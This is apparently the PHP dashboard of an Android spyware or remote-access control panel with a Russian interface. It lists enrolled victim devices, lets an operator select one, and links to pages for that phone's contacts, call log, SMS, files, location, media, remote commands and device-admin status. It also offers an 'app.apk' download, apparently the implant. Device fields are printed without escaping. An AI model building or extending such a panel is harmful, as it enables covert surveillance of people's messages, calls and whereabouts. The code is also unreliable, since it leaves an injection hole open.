
<?php
    require "db.php";
    if($_SESSION['logged_used']==null){
      header('Location: /index');
      exit;
    }
    if($_SESSION['device_select']==null || $_SESSION['device_select'] != $_GET['select']){
    	if(isset($_GET['select'])){
			$sd=R::findOne('devices',"device_id=?",array($_GET['select']));
			$_SESSION['device_select']=$sd;
			$_SESSION['headerDev'] = ($_SESSION['device_select']==null) ? "none": $_SESSION['device_select']->device_id;
        }
    } 
    $headerDev = ($_SESSION['device_select']==null) ? "none": $_SESSION['device_select']->device_id;
    $Admin = isset($_SESSION['admin']) ? true:false;
?>
<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
	<head>
        <meta http-equiv="X-UA-Compatible" content=="IE=edge"/>
        <meta name="google" value="notranslate"/>
        <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

	    <meta charset="UTF-8">
	    <title>Main</title>
	    <link rel="stylesheet" href="./style/home.css">
	    
	    <link rel="stylesheet" href="./style/menu.css">
	    <link rel="stylesheet" href="./style/button.css">
		<link rel="stylesheet" href="./style/barsearch.css">
		<link rel="stylesheet" href="./style/osn.css">

	    <script src="./libs/jquery-3.1.1.min.js"></script>
	    <script src="./scripts/menu.js"></script>
  	</head>
  	<body>
      	<section class="menu">
      		<nav class="main-menu">
	          <p></p>
	          <div class="scrollbar" id="style-1">
	            <ul>
	              <li>                                   
	                <a href="home">
	                  <i class="fa2 theme--light material-icons">home</i>
	                  <span class="nav-text">Главная</span>
	                </a>
	              </li>
	              <li>                                   
	                <a href="Contacts">
	                  <i class="fa2 theme--light material-icons">contacts</i>
	                  <span class="nav-text">Контакты</span>
	                </a>
	              </li>
	              <li>                                 
	                <a href="Call">
	                  <i class="fa2 theme--light material-icons">call</i>
	                  <span class="nav-text">Журнал вызовов</span>
	                </a>
	              </li>   
	              <li>
	                <a href="Block">
	                  <i class="fa2 theme--light material-icons">block</i>
	                  <span class="nav-text">Блок вызовов</span>
	                </a>
	              </li>
	              <li>
	                <a href="Sms">
	                  <i class="fa2 theme--light material-icons">message</i>
	                  <span class="nav-text">Сообщения</span>
	                </a>
	              </li>
	              <li>
	                <a href="FileManager">
	                  <i class="fa2 theme--light material-icons">storage</i>
	                  <span class="nav-text">Проводник</span>
	                </a>
	              </li>
	              <li>
	                <a href="Location">
	                  <i class="fa2 theme--light material-icons">my_location</i>
	                  <span class="nav-text">Расположение</span>
	                </a>
	              </li>
	              <li>
		            <a href="Media">
		              <i class="fa2 theme--light material-icons">widgets</i>
		              <span class="nav-text">Media Files</span>
		            </a>
		          </li>
	              <li>
	                <a href="#">
	                  <i class="fa2 theme--light material-icons">perm_media</i>
	                  <span class="nav-text">Загрузки</span>
	                </a>
	              </li>
	              <li>
	                <a href="#">
	                  <i class="fa2 theme--light material-icons">view_list</i>
	                  <span class="nav-text">Команды</span>
	                </a>
	              </li>
	              <li>
	                <a href="#">
	                  <i class="fa2 theme--light material-icons">list_alt</i>
	                  <span class="nav-text">Журнал приложений</span>
	                </a>
	              </li>
	              <li>
	                <a href="#">
	                  <i class="fa2 theme--light material-icons">details</i>
	                  <span class="nav-text">Информация об устройстве</span>
	                </a>
	              </li>
	              <li>
	                <a href="#">
	                  <i class="fa2 theme--light material-icons">security</i>
	                  <span class="nav-text">Администратор устройства</span>
	                </a>
	              </li>
	            </ul>
	          </div>
        	</nav>
        	<header>
          <div class="head">
            <div class="main-info">
              Выбрано устройство: <?php echo $headerDev; ?>
            </div>
            <div class="spacer"></div>
            
            <a href="app.apk" download="">
              <button type="button" class="btn" id="download">
                <span class="spn">
                  <i class="theme--light material-icons md-36" >get_app</i>
                </span>
              </button>
            </a>
            <div class="usm" onclick="usermenu()">
              <nav title="User Menu" >
                <button type="button" class="btn">
                  <span class="spn">
                    <i class="theme--light material-icons md-36" >account_circle</i>
                  </span>
                </button>
                <ul id="usermenu" class="UserMenu" data-open="false" >
                  <li title="Индификатор">
                    <span style="margin-left: 12px;" class="UserMenu_text">Индификатор: <?=$_SESSION['sid'] ?></span>
                  </li>
                  <li title="Профиль" class="UserMenu_brdt">
                    <a href="Account">
                          <i class="fa2 theme--light material-icons wh"  >person</i>
                          <span class="UserMenu_text">Профиль</span>
                      </a>
                  </li>
                  <li class="UserMenu_brdt" title="Выйти">
                    <a href="logout">
                        <i class="fa2 theme--light material-icons wh">exit_to_app</i>
                        <span class="UserMenu_text">Выйти</span>
                      </a>
                  </li>
                </ul>
              </nav>
            </div>
            
          </div>
        	</header>
	  	</section>
		<div class="v-content fix">
			<div class="v-content_wrap">
				<?php if($Admin) { ?>
				<div class="container">
					<div class="row">
				        <div class="box box-1">
				          <div class="box-header">
				            <a class="box-title" href="#">
				            	<i class="fa2 material-icons md-35 wd">bar_chart</i>
				              	<span>Информация</span>
				            </a>  
				          </div>
				          <div class="boxes-container">
				          	<div class="box1-left-content">Всего аккаунтов: <?=R::count( 'users' ); ?></div>
							
				          	<div class="box1-left-content">Количество устройств: <?=R::count( 'devices' ); ?></div>
				          </div>
				        </div>
				    </div>
				</div>
				<?php } ?>
				<div class="barsearch" >
		            <input type="text" id="search" placeholder="Поиск по таблице" autocomplete="off">
		        </div>
				<div class="container">
					<div class="devices-list">
						<header style="height: 64px;" >
							<div class="v-toolbar__content" style="height: 64px;">
								<div class="icon">
									<i class="fa2 theme--light material-icons md-36">list</i>
								</div>
								<div style="color: black; font-size: 1.25rem;line-height: 1.5;overflow: hidden;text-overflow: ellipsis;white-space: nowrap">
									Список устройств
								</div>
							</div>
						</header>
						<table class="table-device" id="tdevices" width="100%">
							<thead>
								<?php if($Admin) { echo '
									<th>Login</th>
									<th>User ID</th> '; } ?>
							    <th>Name</th>
							    <th>Device ID</th>
							    <th>Android</th>
							    <th>Admin</th>
							    <th>Add Time</th>
							    <th>AppVersion</th>
							    <th></th>
							 </thead>
							 <tbody>
    							<?php 
    							
							        if($Admin){
    										$dev = R::findAll('devices');
									}
									else{
										$dev = R::findAll('devices', "user_id = ?", array($_SESSION['logged_used']->sid));
									}
									
									foreach ($dev as $item ) { ?>
        								<tr <?php if($_SESSION['device_select']->device_id == $item->device_id) { ?> style="background-color: green;" <?php } ?> >
        									<?php if($Admin && $dev!=null) {
        									$us = R::findOne('users',"sid=?",array($item->user_id)); ?>
        										<td><?=$us->login; ?></td>
        										<td><?=$item->user_id; ?></td> 
        									<?php } ?>
        									<td id="Name"><?=$item->name; ?></td>
        									<td><?=$item->device_id; ?></td>
        									<td><?=$item->android; ?></td>
        									<td><?=$item->admin; ?></td>
        									<td><?=$item->add_time; ?></td>
        									<td><?=$item->app_version; ?></td>
        									<td style="width:100px;"><a href="home?select=<?=$item->device_id; ?> " class="btn-select" style="width: 100px; height: 100%;" >Выбрать</a></td>
        								</tr>
    						        <?php  } ?>
							</tbody>
						</table>
						<?php if($dev==null) { ?>
						<div style="color: red; font-size: 22px;">
							<i class="theme--light material-icons" style="color: red;" >info</i> У вас нет устройств
						</div>
						<?php } ?>
					</div>
				</div>

				
			</div>
		</div>
		
  	</body>
  	<script>
		$(document).ready(function(){
		  $("#search").keyup(function(){
		    _this = this;
		  $.each($("#tdevices tbody tr"), function() {
		          if($(this).text().toLowerCase().indexOf($(_this).val().toLowerCase()) === -1 ){
		              $(this).hide();
		          } else {
		              $(this).show();                
		          }
		        });
		    });
		  });

	</script>
</html>